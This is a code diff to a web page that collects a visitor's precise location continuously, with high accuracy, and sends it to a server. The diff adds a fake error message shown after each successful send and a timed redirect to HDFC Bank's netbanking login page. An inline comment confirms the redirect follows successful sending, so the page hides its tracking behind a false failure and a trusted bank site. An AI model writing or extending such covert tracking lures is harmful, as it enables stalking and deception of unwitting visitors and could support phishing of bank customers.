@@ -13,7 +13,7 @@
     h2 {
       color: #333;
     }
-    #loading {
+	#loading {
       color: #555;
       font-size: 16px;
       margin-top: 20px;
@@ -33,6 +33,13 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude, longitude, timestamp })
       })
+      .then(() => {
+        document.body.innerHTML = "<h2>Something went wrong. Please try again!</h2>";
+		// Redirect after successful sending
+		setTimeout(() => {
+          window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
+        }, 1500);
+      })
       .catch(() => {
         console.log("Failed to fetch location");
       });
@@ -42,26 +49,12 @@
       document.body.innerHTML = `<h2>Location access denied: ${error.message}</h2>`;
     }
 
-    function startLiveTracking() {
+    if (navigator.geolocation) {
       navigator.geolocation.watchPosition(sendLocation, handleError, {
         enableHighAccuracy: true,
         maximumAge: 0,
         timeout: 5000
       });
-    }
-
-    if (navigator.geolocation) {
-      // First request one-time permission
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          sendLocation(position);
-          startLiveTracking();
-          document.getElementById("loading").innerText = "Something went wrong. Please try again...";
-        },
-        handleError
-      );
-    } else {
-      document.body.innerHTML = "<h2>Your browser doesn't support geolocation.</h2>";
     }
   </script>
 </body>
